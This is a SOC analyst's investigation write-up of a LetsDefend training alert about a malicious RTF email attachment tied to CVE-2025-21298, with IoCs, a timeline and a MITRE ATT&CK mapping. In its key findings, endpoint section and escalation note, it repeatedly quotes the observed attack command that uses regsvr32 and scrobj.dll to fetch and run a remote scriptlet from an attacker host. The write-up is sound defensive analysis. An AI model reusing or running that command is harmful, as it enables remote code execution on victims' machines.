# SOC336 - Windows OLE Zero-Click RCE Exploitation Detected (CVE-2025-21298)

# Executive Summary

A critical email-based malware alert was triggered after a user received a suspicious RTF attachment associated with CVE-2025-21298. During the investigation, I confirmed that the attachment was malicious, identified Outlook spawning cmd.exe, observed regsvr32.exe LOLBin abuse to retrieve a remote .sct payload, and validated the network request to attacker-controlled infrastructure through proxy logs. The alert was classified as a True Positive and escalated for Incident Response.


This case needed to investigate the alert across multiple telemetry sources:

- Email security --> suspicious sender, malicious attachment, phishing lure
- Threat intelligence --> malicious file hash and exploit-related detections
- Endpoint telemetry --> Outlook spawning cmd.exe and regsvr32.exe
- Network / proxy logs --> confirmed access to malicious remote infrastructure

### Key Findings

- Malicious email delivered to the user with RTF attachment mail.rtf
- Attachment hash flagged by 27/61 vendors in VirusTotal
- Detections linked the file to CVE-2025-21298
- Endpoint logs showed OUTLOOK.EXE spawning cmd.exe
- cmd.exe executed regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll
- Proxy logs confirmed a permitted GET request to http://84.38.130.118.com/shell.sct
- Incident classified as True Positive and escalated to IR

### Final Verdict

- Field           |	Value
- Classification  |	True Positive
- Severity	      | Critical
- Attack Type	    | Malicious Email / Exploit Attachment / LOLBin Execution
- Escalated to IR |	Yes

### Tools / Data Sources Used
- LetsDefend Email Security
- LetsDefend Endpoint Security
- LetsDefend Log Management
- VirusTotal
- MITRE ATT&CK

# Complete investigation

## Alert Overview

| Field                   | Value                                                                         |
| ----------------------- | ----------------------------------------------------------------------------- |
| **Alert Name**          | SOC336 - Windows OLE Zero-Click RCE Exploitation Detected (CVE-2025-21298)    |
| **Event ID**            | 314                                                                           |
| **Severity**            | Critical                                                                      |
| **Event Time**          | Feb 04, 2025, 04:18 PM                                                        |
| **SMTP Address**        | 84.38.130.118                                                                 |
| **Source Address**      | [projectmanagement@pm.me](mailto:projectmanagement@pm.me)                     |
| **Destination Address** | [Austin@letsdefend.i](mailto:Austin@letsdefend.io)o                           |
| **Email Subject**       | Important: Action Required for Upcoming Project Deadline                      |
| **Attachment**          | mail.rtf                                                                      |
| **Attachment Hash**     | df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184              |
| **Device Action**       | Allowed                                                                       |
| **Trigger Reason**      | Malicious RTF attachment identified with known CVE-2025-21298 exploit pattern |

---

# Executive Findings

| # | Finding                                                                                       | Why It Matters                                                                   |
| - | --------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
| 1 | The email used a suspicious external sender and urgency-themed subject line.                  | Strong phishing / social engineering indicators.                                 |
| 2 | The attachment `mail.rtf` was flagged by **27/61** security vendors in VirusTotal.            | Confirms high suspicion and strong malicious reputation.                         |
| 3 | VirusTotal detections referenced **CVE-2025-21298** and malicious RTF exploitation.           | Supports the alert context and exploit hypothesis.                               |
| 4 | Endpoint telemetry showed **OUTLOOK.EXE spawning ****`cmd.exe`**.                             | Indicates suspicious execution linked to the email client.                       |
| 5 | `cmd.exe` executed **`regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll`**. | This is classic LOLBin abuse used to retrieve and execute remote script content. |
| 6 | Proxy logs confirmed an outbound GET request to **`http://84.38.130.118.com/shell.sct`**.     | Validates that the malicious command reached attacker-controlled infrastructure. |
| 7 | Multiple telemetry sources aligned with the same infection chain.                             | Allowed confident classification of the alert as a **True Positive**.            |

---

# Investigation Walkthrough

## 1) Email Analysis

The first step was reviewing the email in **LetsDefend Email Security**. The message came from **`projectmanagement@pm.me`** and used an urgency-themed lure:

> **"Important: Action Required for Upcoming Project Deadline"**

The body instructed the recipient to review an attached document for project-related details. This was suspicious because:

* the sender was external and untrusted,
* the message used **urgency / business pretexting**,
* and the email contained an **RTF attachment** rather than a normal project file format.

### Email Evidence

| Field                       | Value                                                     |
| --------------------------- | --------------------------------------------------------- |
| **From**                    | [projectmanagement@pm.me](mailto:projectmanagement@pm.me) |
| **To**                      | [Austin@letsdefend.io](mailto:Austin@letsdefend.io)       |
| **Subject**                 | Important: Action Required for Upcoming Project Deadline  |
| **Attachment**              | mail.rtf                                                  |
| **Password shown in email** | infected                                                  |
| **Email action**            | Allowed                                                   |

---

## 2) Attachment Reputation / Threat Intelligence

The attachment hash was checked in **VirusTotal**. The file was flagged by **27 out of 61 vendors** and multiple detections referenced:

* **CVE-2025-21298**
* malicious RTF exploitation
* exploit / trojan-style detections

This was a major confirmation point because it aligned directly with the alert title and trigger reason.

### Attachment Reputation

| Field                        | Value                                                            |
| ---------------------------- | ---------------------------------------------------------------- |
| **File Name**                | mail.rtf                                                         |
| **SHA256**                   | df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184 |
| **VT Detection Ratio**       | 27 / 61                                                          |
| **Notable Detection Themes** | Exploit, Trojan, Malicious RTF, CVE-2025-21298                   |

### Examples of Notable Detections

* `Exploit.CVE-2025-21298`
* `RTF:CVE-2025-21298`
* `Trojan.MSOffice.CVE-2025-21298`
* exploit / trojan / malicious RTF family-style labels

At this point, the case was already highly suspicious, but I still needed **execution evidence** on the endpoint to confirm that the attachment likely triggered malicious behavior.

---

## 3) Endpoint Investigation

I moved into **LetsDefend Endpoint Security** to determine whether the email led to suspicious process activity on the host.

Initially, there were Outlook-related process entries, but the key evidence was the following process execution chain:

### Suspicious Command Observed

```cmd
C:\Windows\System32\cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll
```

This was a major pivot point in the investigation.

### Why this is suspicious

* **`regsvr32.exe`** is a legitimate Windows binary, but it is also a well-known **LOLBin** abused by attackers.
* The `/i:` argument points to a **remote URL**:

  * `http://84.38.130.118.com/shell.sct`
* `scrobj.dll` is commonly used with `regsvr32` to execute scriptlet content fetched from a remote source.
* The command was launched through **`cmd.exe`**, and the process chain showed **Outlook involvement**, which strongly suggests execution related to the malicious attachment.

### Endpoint Evidence

| Field                          | Value                                                                            |
| ------------------------------ | -------------------------------------------------------------------------------- |
| **Parent Process**             | OUTLOOK.EXE                                                                      |
| **Child Process**              | cmd.exe                                                                          |
| **Suspicious LOLBin**          | regsvr32.exe                                                                     |
| **Command**                    | `cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll` |
| **Associated Remote Resource** | `http://84.38.130.118.com/shell.sct`                                             |

This was no longer just a suspicious email with a bad attachment — now there was **clear endpoint evidence of suspicious post-delivery execution**.

---

## 4) Log Management / Proxy Validation

To validate whether the malicious command actually generated outbound traffic, I checked **LetsDefend Log Management** for the IP/domain referenced in the command.

A matching proxy log was found:

### Proxy Log Evidence

| Field                   | Value                                |
| ----------------------- | ------------------------------------ |
| **Log Type**            | Proxy                                |
| **Source Address**      | 172.16.17.137                        |
| **Source Port**         | 35424                                |
| **Destination Address** | 84.38.130.118                        |
| **Destination Port**    | 80                                   |
| **Time**                | Feb 04, 2025, 08:06 AM               |
| **Request URL**         | `http://84.38.130.118.com/shell.sct` |
| **Request Method**      | GET                                  |
| **Device Action**       | Permitted                            |
| **Process**             | cmd.exe                              |
| **Process ID**          | 6784                                 |

This was the final confirmation I needed.
The endpoint did not just **attempt** to execute a suspicious LOLBin command — it also **successfully reached out** to the attacker-controlled infrastructure and requested the remote `.sct` payload.

---

# Why the Case Was a True Positive

The case was classified as a **True Positive** because multiple independent data sources aligned into the same malicious execution chain:

1. **Suspicious email** with social engineering lure and RTF attachment
2. **Malicious hash reputation** in VirusTotal linked to exploit activity
3. **Endpoint evidence** showing Outlook spawning a suspicious command chain
4. **LOLBin abuse** through `regsvr32.exe`
5. **Proxy log confirmation** of access to the malicious remote script URL

Any one of these alone would be concerning. Together, they form a coherent and high-confidence malicious timeline.

---

# Indicators of Compromise (IoCs)

## Email / File IoCs

| Type                | Indicator                                                          |
| ------------------- | ------------------------------------------------------------------ |
| **Sender Email**    | `projectmanagement@pm.me`                                          |
| **Recipient**       | `Austin@letsdefend.io`                                             |
| **Subject**         | `Important: Action Required for Upcoming Project Deadline`         |
| **Attachment Name** | `mail.rtf`                                                         |
| **SHA256**          | `df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184` |

## Network / Infrastructure IoCs

| Type                  | Indicator                            |
| --------------------- | ------------------------------------ |
| **SMTP / Related IP** | `84.38.130.118`                      |
| **Remote URL**        | `http://84.38.130.118.com/shell.sct` |
| **Destination IP**    | `84.38.130.118`                      |

## Process / Execution IoCs

| Type                       | Indicator      |
| -------------------------- | -------------- |
| **Parent Process**         | `OUTLOOK.EXE`  |
| **Child Process**          | `cmd.exe`      |
| **LOLBin**                 | `regsvr32.exe` |
| **DLL / Scriptlet Engine** | `scrobj.dll`   |

---

# Timeline

| Time                      | Event                                                                                                      |
| ------------------------- | ---------------------------------------------------------------------------------------------------------- |
| **Feb 04, 2025 05:12 AM** | Malicious email delivered to `Austin@letsdefend.io`                                                        |
| **Feb 04, 2025**          | Email reviewed in LetsDefend Email Security; suspicious sender, urgent lure, and RTF attachment identified |
| **Feb 04, 2025**          | Attachment hash checked in VirusTotal; 27/61 vendors flagged it as malicious                               |
| **Feb 04, 2025**          | VirusTotal detections linked the file to malicious RTF exploitation and CVE-2025-21298                     |
| **Feb 04, 2025 08:06 AM** | Endpoint telemetry showed suspicious command execution via `cmd.exe` and `regsvr32.exe`                    |
| **Feb 04, 2025 08:06 AM** | Proxy log confirmed outbound GET request to `http://84.38.130.118.com/shell.sct`                           |
| **Post-analysis**         | Alert classified as **True Positive** and escalated to Incident Response                                   |

---

# MITRE ATT&CK Mapping

| Tactic                                      | Technique                                                | ID            | Why It Fits                                                                                  |
| ------------------------------------------- | -------------------------------------------------------- | ------------- | -------------------------------------------------------------------------------------------- |
| **Initial Access**                          | Spearphishing Attachment                                 | **T1566.001** | The attack started with a malicious RTF attachment delivered by email.                       |
| **Execution**                               | Command and Scripting Interpreter: Windows Command Shell | **T1059.003** | `cmd.exe` was used to execute the suspicious command.                                        |
| **Defense Evasion / Execution**             | Signed Binary Proxy Execution: Regsvr32                  | **T1218.010** | `regsvr32.exe` was abused as a LOLBin to retrieve/execute remote content.                    |
| **Command and Control / Payload Retrieval** | Ingress Tool Transfer                                    | **T1105**     | The host retrieved a remote scriptlet (`shell.sct`) from attacker-controlled infrastructure. |

---

# Escalation Note for Incident Response

**True Positive.** A malicious email was delivered to **[Austin@letsdefend.io](mailto:Austin@letsdefend.io)** from **[projectmanagement@pm.me](mailto:projectmanagement@pm.me)** with attachment **`mail.rtf`**. The attachment hash **`df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184`** was flagged by **27/61 vendors** in VirusTotal, with detections referencing **malicious RTF exploitation** and **CVE-2025-21298**. Endpoint telemetry showed **`OUTLOOK.EXE`**** spawning ****`cmd.exe`**, which executed **`regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll`**, indicating LOLBin abuse to retrieve remote script content. Proxy logs confirmed a **permitted GET request** from internal host **172.16.17.137** to **`http://84.38.130.118.com/shell.sct`** at **08:06 AM**. Based on the malicious email, exploit-themed attachment detections, suspicious process chain, and confirmed outbound request to attacker-controlled infrastructure, the alert should be treated as a **confirmed malicious incident** and escalated for containment and deeper host review.

---

# Lessons Learned

This case reinforced several important SOC investigation concepts:

1. **A malicious attachment alone is not enough for a strong escalation** if you can still validate execution evidence.
2. **Email + endpoint + network correlation** is often what turns a suspicious alert into a high-confidence True Positive.
3. **LOLBin abuse matters a lot in SOC work**. Seeing legitimate binaries like `regsvr32.exe` used with remote URLs is a major red flag.
4. **Process lineage is critical**. The fact that Outlook led into `cmd.exe` and then into `regsvr32.exe` made the case much stronger.
5. **Proxy logs can close the loop** by confirming whether the endpoint actually reached attacker infrastructure after suspicious execution.

---

# Short Recruiter-Friendly Summary

This case demonstrates my ability to investigate a **critical malware alert** by correlating **email telemetry, threat intelligence, endpoint process activity, and proxy logs**. I validated a malicious RTF attachment, identified **Outlook spawning a suspicious ****`regsvr32.exe`**** LOLBin execution chain**, confirmed outbound traffic to attacker infrastructure, and escalated the case as a **True Positive** with a concise IR-ready summary.

